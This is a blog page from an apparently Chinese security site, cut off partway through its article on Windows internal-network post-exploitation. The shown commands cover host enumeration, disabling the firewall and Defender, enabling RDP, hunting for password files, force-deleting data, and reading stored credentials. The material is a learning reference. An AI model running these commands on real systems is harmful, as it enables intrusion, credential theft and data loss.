           data-author="" >
            <span class="post-title" title="Python_requests模块">Python_requests模块</span>
            <span class="post-date" title="2019-11-29 19:05:39">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/Python%E5%9F%BA%E7%A1%80/"
           data-tag="知识,python"
           data-author="" >
            <span class="post-title" title="Python3基础">Python3基础</span>
            <span class="post-date" title="2019-12-23 23:14:43">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/SQL%E6%B3%A8%E5%85%A5/"
           data-tag="注入,phpmyadmin,SQL"
           data-author="" >
            <span class="post-title" title="SQL注入">SQL注入</span>
            <span class="post-date" title="2019-12-01 21:45:31">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/SqlServer/"
           data-tag="数据库,mssql"
           data-author="" >
            <span class="post-title" title="SqlServer">SqlServer</span>
            <span class="post-date" title="2020-05-24 19:54:32">2020/05/24</span>
        </a>
        
        <a  class=""
           href="/SSRF/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="SSRF">SSRF</span>
            <span class="post-date" title="2020-01-24 11:50:18">2020/01/24</span>
        </a>
        
        <a  class=""
           href="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/"
           data-tag="漏洞,Struts2,vulhub"
           data-author="" >
            <span class="post-title" title="Struts2漏洞系列">Struts2漏洞系列</span>
            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/Sqlmap/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="Sqlmap">Sqlmap</span>
            <span class="post-date" title="2020-05-24 01:39:30">2020/05/24</span>
        </a>
        
        <a  class=""
           href="/Thinkphp/"
           data-tag="漏洞,vulhub,CVE"
           data-author="" >
            <span class="post-title" title="Thinkphp">Thinkphp</span>
            <span class="post-date" title="2020-03-31 20:38:23">2020/03/31</span>
        </a>
        
        <a  class=""
           href="/Tomcat/"
           data-tag="漏洞,中间件"
           data-author="" >
            <span class="post-title" title="Tomcat">Tomcat</span>
            <span class="post-date" title="2020-05-14 20:46:32">2020/05/14</span>
        </a>
        
        <a  class=""
           href="/Windows%E4%B9%8B%E8%AE%A4%E8%AF%81%E7%9F%A5%E8%AF%86/"
           data-tag="工具,windows"
           data-author="" >
            <span class="post-title" title="Windows之认证知识">Windows之认证知识</span>
            <span class="post-date" title="2020-04-19 15:08:46">2020/04/19</span>
        </a>
        
        <a  class=""
           href="/Windows%E5%AE%89%E5%85%A8/"
           data-tag="应急响应,windows"
           data-author="" >
            <span class="post-title" title="Windows安全">Windows安全</span>
            <span class="post-date" title="2020-04-10 20:48:56">2020/04/10</span>
        </a>
        
        <a  class=""
           href="/backdoors/"
           data-tag="backdoor"
           data-author="" >
            <span class="post-title" title="backdoors">backdoors</span>
            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/XSS/"
           data-tag="漏洞,bypass,xss,DOM"
           data-author="" >
            <span class="post-title" title="XSS">XSS</span>
            <span class="post-date" title="2019-12-18 13:24:05">2019/12/18</span>
        </a>
        
        <a  class=""
           href="/docker%E4%BD%BF%E7%94%A8/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="docker使用">docker使用</span>
            <span class="post-date" title="2019-12-20 15:17:33">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/dedecms/"
           data-tag="漏洞,cms"
           data-author="" >
            <span class="post-title" title="dedecms">dedecms</span>
            <span class="post-date" title="2020-08-14 21:16:51">2020/08/14</span>
        </a>
        
        <a  class=""
           href="/hashcat/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="hashcat">hashcat</span>
            <span class="post-date" title="2019-12-26 11:11:09">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/hexo-help/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="hexo_help">hexo_help</span>
            <span class="post-date" title="2019-11-29 16:45:43">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/phpmyadmin/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="phpmyadmin">phpmyadmin</span>
            <span class="post-date" title="2020-05-17 20:08:29">2020/05/17</span>
        </a>
        
        <a  class=""
           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
           data-tag="知识,encode_decode"
           data-author="" >
            <span class="post-title" title="python与编码解码">python与编码解码</span>
            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
        </a>
        
        <a  class=""
           href="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="python小脚本">python小脚本</span>
            <span class="post-date" title="2020-02-26 10:59:03">2020/02/26</span>
        </a>
        
        <a  class=""
           href="/shell/"
           data-tag="shell,后门"
           data-author="" >
            <span class="post-title" title="shell">shell</span>
            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"
           data-tag="靶场,vulnhub,僵尸网络"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之Bitbot.VulnVM-disk1">完结-vulnhub之Bitbot.VulnVM-disk1</span>
            <span class="post-date" title="2019-12-30 00:22:42">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之21LTLTR_Scene_1">完结-vulnhub之21LTLTR_Scene_1</span>
            <span class="post-date" title="2019-12-28 21:03:12">2019/12/28</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF5">完结-vulnhub之LAMPSecurity-CTF5</span>
            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF4">完结-vulnhub之LAMPSecurity-CTF4</span>
            <span class="post-date" title="2020-03-16 14:27:30">2020/03/16</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF6">完结-vulnhub之LAMPSecurity-CTF6</span>
            <span class="post-date" title="2020-03-17 13:51:54">2020/03/17</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF7">完结-vulnhub之LAMPSecurity-CTF7</span>
            <span class="post-date" title="2020-03-18 14:49:09">2020/03/18</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8Bchanakya/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之chanakya">完结-vulnhub之chanakya</span>
            <span class="post-date" title="2020-12-05 21:43:10">2020/12/05</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之LAMPSecurity-CTF8">完结-vulnhub之LAMPSecurity-CTF8</span>
            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8Bdhanush/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="完结-vulnhub之dhanush">完结-vulnhub之dhanush</span>
            <span class="post-date" title="2020-12-06 00:04:55">2020/12/06</span>
        </a>
        
        <a  class=""
           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/"
           data-tag="内网渗透,域渗透,靶场"
           data-author="" >
            <span class="post-title" title="完结—vulnstack红队评估一">完结—vulnstack红队评估一</span>
            <span class="post-date" title="2021-01-03 20:11:14">2021/01/03</span>
        </a>
        
        <a  class=""
           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/"
           data-tag="域渗透,靶场"
           data-author="" >
            <span class="post-title" title="完结——vulnstack红队评估三">完结——vulnstack红队评估三</span>
            <span class="post-date" title="2021-01-18 20:31:30">2021/01/18</span>
        </a>
        
        <a  class=""
           href="/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C/"
           data-tag="内网渗透,域渗透,靶场"
           data-author="" >
            <span class="post-title" title="完结-vulnstack红队评估二">完结-vulnstack红队评估二</span>
            <span class="post-date" title="2020-07-25 23:38:38">2020/07/25</span>
        </a>
        
        <a  class=""
           href="/webshell/"
           data-tag="shell,webshell,内存马"
           data-author="" >
            <span class="post-title" title="webshell">webshell</span>
            <span class="post-date" title="2020-05-04 23:57:34">2020/05/04</span>
        </a>
        
        <a  class=""
           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="信息安全百科">信息安全百科</span>
            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
        </a>
        
        <a  class=""
           href="/%E5%85%8D%E6%9D%80%E4%B8%8E%E7%BB%95%E8%BF%87/"
           data-tag="bypass,远控,免杀"
           data-author="" >
            <span class="post-title" title="免杀 &amp;&amp; 绕过">免杀 &amp;&amp; 绕过</span>
            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
           data-tag="内网渗透"
           data-author="" >
            <span class="post-title" title="内网渗透之Empire">内网渗透之Empire</span>
            <span class="post-date" title="2019-12-19 11:42:47">2019/12/19</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLinux/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="内网渗透之Linux">内网渗透之Linux</span>
            <span class="post-date" title="2020-10-30 16:15:14">2020/10/30</span>
        </a>
        
        <a  class=""
           href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,端口"
           data-author="" >
            <span class="post-title" title="各端口服务漏洞">各端口服务漏洞</span>
            <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
           data-tag="工具,内网渗透,域渗透,windows,mimikatz"
           data-author="" >
            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
        </a>
        
        <a  class=""
           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
           data-tag="知识,漏洞"
           data-author="" >
            <span class="post-title" title="同源策略">同源策略</span>
            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
           data-tag="linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
        </a>
        
        <a  class=""
           href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"
           data-tag="信息搜集,CDN"
           data-author="" >
            <span class="post-title" title="寻找网站的真实IP">寻找网站的真实IP</span>
            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
           data-tag="linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux">提权之Linux</span>
            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
           data-tag="windows,提权"
           data-author="" >
            <span class="post-title" title="提权之Windows">提权之Windows</span>
            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
           data-tag="windows,提权,DLL"
           data-author="" >
            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
           data-tag="提权"
           data-author="" >
            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
        </a>
        
        <a  class=""
           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
        </a>
        
        <a  class=""
           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="正则表达式">正则表达式</span>
            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
        </a>
        
        <a  class=""
           href="/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="渗透工具">渗透工具</span>
            <span class="post-date" title="2021-01-07 22:47:15">2021/01/07</span>
        </a>
        
        <a  class=""
           href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
           data-tag="信息搜集"
           data-author="" >
            <span class="post-title" title="渗透测试之信息搜集">渗透测试之信息搜集</span>
            <span class="post-date" title="2020-08-25 00:36:08">2020/08/25</span>
        </a>
        
        <a  class=""
           href="/%E6%BA%AF%E6%BA%90/"
           data-tag="蓝方,防守"
           data-author="" >
            <span class="post-title" title="溯源">溯源</span>
            <span class="post-date" title="2020-12-08 21:43:32">2020/12/08</span>
        </a>
        
        <a  class=""
           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
           data-tag="工具,内网渗透,端口"
           data-author="" >
            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,editor"
           data-author="" >
            <span class="post-title" title="编辑器漏洞">编辑器漏洞</span>
            <span class="post-date" title="2020-08-19 12:15:10">2020/08/19</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳二">脱壳二</span>
            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳一">脱壳一</span>
            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/ATTACK%E5%AD%A6%E4%B9%A0/"
           data-tag="知识,backdoor,shell"
           data-author="" >
            <span class="post-title" title="ATTACK学习">ATTACK学习</span>
            <span class="post-date" title="2020-01-13 10:26:28">2020/01/13</span>
        </a>
        
        <a  class=""
           href="/Web-CheckList/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
        </a>
        
        <a  class=""
           href="/%E6%97%A5%E5%BF%97/"
           data-tag="log,后渗透,FTP,日志"
           data-author="" >
            <span class="post-title" title="日志">日志</span>
            <span class="post-date" title="2020-07-25 22:12:45">2020/07/25</span>
        </a>
        
        <a  class=""
           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
           data-tag="漏洞,端口"
           data-author="" >
            <span class="post-title" title="漏洞记录">漏洞记录</span>
            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-内网渗透之windows" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">内网渗透之windows</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            
            <a class="color3">工具</a>
            
            <a class="color5">内网渗透</a>
            
            <a class="color4">域渗透</a>
            
            <a class="color3">windows</a>
            
            <a class="color4">mimikatz</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title=''>2020-02-20 13:44<br/>
        更新时间: 2021-01-26 22:00:51
        </time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-内网渗透"><span class="toc-text">0x00 内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-系统相关命令"><span class="toc-text">0x10 系统相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-网络相关命令"><span class="toc-text">0x11 网络相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-进程及服务"><span class="toc-text">0x12 进程及服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-用户相关命令"><span class="toc-text">0x13 用户相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-目录文件相关"><span class="toc-text">0x14 目录文件相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-凭据搜集"><span class="toc-text">0x15 凭据搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-WIFI密码"><span class="toc-text">0x16 WIFI密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x17-单行命令扫描存活主机"><span class="toc-text">0x17 单行命令扫描存活主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x18-windows自带工具命令行下载文件"><span class="toc-text">0x18 windows自带工具命令行下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x19-windows-执行远程文件"><span class="toc-text">0x19 windows 执行远程文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-域信息搜集命令一"><span class="toc-text">0x20 域信息搜集命令一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21-域信息搜集命令二"><span class="toc-text">0x21 域信息搜集命令二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）"><span class="toc-text">0x22 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23-Bloodhound"><span class="toc-text">0x23 Bloodhound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x24-利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"><span class="toc-text">0x24 利用LLMNR和NetBIOS欺骗获得Net-NTLMHash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x25-利用WPAD劫持获得Net-NTLMHash"><span class="toc-text">0x25 利用WPAD劫持获得Net-NTLMHash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x26-SMB-Relay（SMB中继）攻击（Responder中的MultiRelayx-py）"><span class="toc-text">0x26 SMB Relay（SMB中继）攻击（Responder中的MultiRelayx.py）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x27-SMB-Relay（SMB中继）攻击（Impacket中的smbrelayx-py）"><span class="toc-text">0x27 SMB Relay（SMB中继）攻击（Impacket中的smbrelayx.py）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-横向渗透——域中获取账号后"><span class="toc-text">0x30 横向渗透——域中获取账号后</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x31-windows提权"><span class="toc-text">0x31 windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-bypass-UAC"><span class="toc-text">windows bypass UAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068-CVE-2014-6324-域控提权利用"><span class="toc-text">MS14-068(CVE-2014-6324)域控提权利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x32-管理员权限-多方法执行mimikatz-amp-amp-多方法获取hash"><span class="toc-text">0x32 (管理员权限)多方法执行mimikatz &amp;&amp; 多方法获取hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x33-mimikatz攻击"><span class="toc-text">0x33 mimikatz攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-域控"><span class="toc-text">0x40 域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-票据传递攻击"><span class="toc-text">0x50 票据传递攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x51-约束委派"><span class="toc-text">0x51 约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网CVE漏洞"><span class="toc-text">内网CVE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xF0-krbtgt密码"><span class="toc-text">0xF0 krbtgt密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xF1-其他搜集工具"><span class="toc-text">0xF1 其他搜集工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-参考"><span class="toc-text">0xFF 参考</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-内网渗透"><a href="#0x00-内网渗透" class="headerlink" title="0x00 内网渗透"></a>0x00 内网渗透</h2><ol>
<li>顾名思义：在限制范围的局域网做渗透。</li>
</ol>
<hr>
<h2 id="0x10-系统相关命令"><a href="#0x10-系统相关命令" class="headerlink" title="0x10 系统相关命令"></a>0x10 系统相关命令</h2><ol>
<li><code>systeminfo</code> #系统信息</li>
<li><code>systeminfo /s IP /u [username] /p [password]</code> #查看远程主机的系统配置</li>
<li><code>set</code> #环境变量</li>
<li><code>netsh firewall show config</code> #显示防火墙配置</li>
<li><code>netsh firewall show state</code> #显示防火墙状态</li>
<li><code>netsh advfirewall set allprofiles state off</code>  #关闭防火墙</li>
<li><code>net stop windefend</code> #关闭防火墙</li>
<li><code>ver</code> #查看当前NT内核版本</li>
<li><code>hostname</code> #主机名</li>
<li><code>fsutil fsinfo drives</code> #列出所有盘符</li>
</ol>
<h2 id="0x11-网络相关命令"><a href="#0x11-网络相关命令" class="headerlink" title="0x11 网络相关命令"></a>0x11 网络相关命令</h2><ol>
<li><code>ipconfig /all</code> #显示网络详细信息</li>
<li><code>ipconfig /displaydns</code> #查看DNS缓存</li>
<li><code>route print</code> #路由信息，netstat -r同样效果</li>
<li><code>arp -a</code> #查看arp表</li>
<li><code>netstat -ano</code> #网络连接信息</li>
<li><code>net use</code> #查看网络连接</li>
<li><code>net share</code> #查看已开启共享</li>
<li><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code> #查看RDP端口状况</li>
<li><ul>
<li>回显：PortNumber    REG_DWORD    0xd3d</li>
</ul>
</li>
<li><code>REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v [项的名称] /t REG_DWORD /d [项的值] /f</code> #add：新建，/v：项的名称，/d：项的值，/f：强制</li>
<li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> #开启3389</li>
<li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x344D /f</code> #更改默认端口3389为13389</li>
<li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x344D /f</code> #更改默认端口3389为13389</li>
</ol>
<h2 id="0x12-进程及服务"><a href="#0x12-进程及服务" class="headerlink" title="0x12 进程及服务"></a>0x12 进程及服务</h2><ol>
<li><code>tasklist</code> #查看进程列表及PID</li>
<li><code>taskkill /F /im calc.exe</code> #强行结束进程</li>
<li><code>net start</code> #查看当前运行的服务</li>
<li><code>netstat -ano</code> #网络连接信息</li>
</ol>
<h2 id="0x13-用户相关命令"><a href="#0x13-用户相关命令" class="headerlink" title="0x13 用户相关命令"></a>0x13 用户相关命令</h2><ol>
<li><code>whoami /all</code> #当前用户</li>
<li><code>net user</code> #列出本地所有用户</li>
<li><code>net1 user</code> #列出本地所有用户</li>
<li><code>query user | quser</code> #查看远程主机在线用户</li>
<li><code>net localgroup administrators</code> #查看本机管理员</li>
<li><code>net1 localgroup administrators</code> #查看本机管理员</li>
<li><code>net accounts</code> #查看本地密码策略</li>
<li><code>net session</code> #查看当前会话</li>
</ol>
<h2 id="0x14-目录文件相关"><a href="#0x14-目录文件相关" class="headerlink" title="0x14 目录文件相关"></a>0x14 目录文件相关</h2><ol>
<li><code>type c:\windows\system32\drivers\etc\hosts</code> #查看hosts文件</li>
<li><code>findstr /s /m /i &quot;password&quot; *.*</code> #/s：搜索当前目录下所有文件及子目录下文件包含关键字”password”的文件，/m：只输出路径+文件名，/i：忽略大小写，/x：打印完全匹配的行，/n：在匹配的每行前打印行数</li>
<li><code>findstr &quot;hello world&quot; A.B</code> #在A.B中查找“hello”或“world”</li>
<li><code>findstr /C:&quot;hello world&quot; A.B</code> #在A.B中查找“hello world”</li>
<li>指定目录下的文件中搜集各种账号密码<pre><code>findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</code></pre></li>
<li><code>chdir</code> #查看当前路径</li>
<li><code>dir</code> #列出当前目录及文件</li>
<li>指定目录下搜集各类敏感文件<pre><code>dir /a /s /b d:\&quot;*.txt&quot;
dir /a /s /b d:\&quot;*.xml&quot;
dir /a /s /b d:\&quot;*.mdb&quot;
dir /a /s /b d:\&quot;*.sql&quot;
dir /a /s /b d:\&quot;*.mdf&quot;
dir /a /s /b d:\&quot;*.eml&quot;
dir /a /s /b d:\&quot;*.pst&quot;
dir /a /s /b d:\&quot;*conf*&quot;
dir /a /s /b d:\&quot;*bak*&quot;
dir /a /s /b d:\&quot;*pwd*&quot;
dir /a /s /b d:\&quot;*pass*&quot;
dir /a /s /b d:\&quot;*login*&quot;
dir /a /s /b d:\&quot;*user*&quot;</code></pre></li>
<li><code>del d:\ad\*.* /a /s /q /f</code> #强制删除指定路径下的所有文件</li>
<li><code>rd /q/s c:\windows\temp\test</code> #删除文件夹</li>
</ol>
<h2 id="0x15-凭据搜集"><a href="#0x15-凭据搜集" class="headerlink" title="0x15 凭据搜集"></a>0x15 凭据搜集</h2><ol>
<li><strong>cmd执行命令：</strong></li>
<li><code>cmdkey /list</code></li>
</ol>
<p><strong>Navicat各种登录记录密码</strong></p>
<pre><code>MySQL
    HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt;target&gt;
MariaDB
    HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt;target&gt;
MongoDB
    HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt;target&gt;
Microsoft SQL
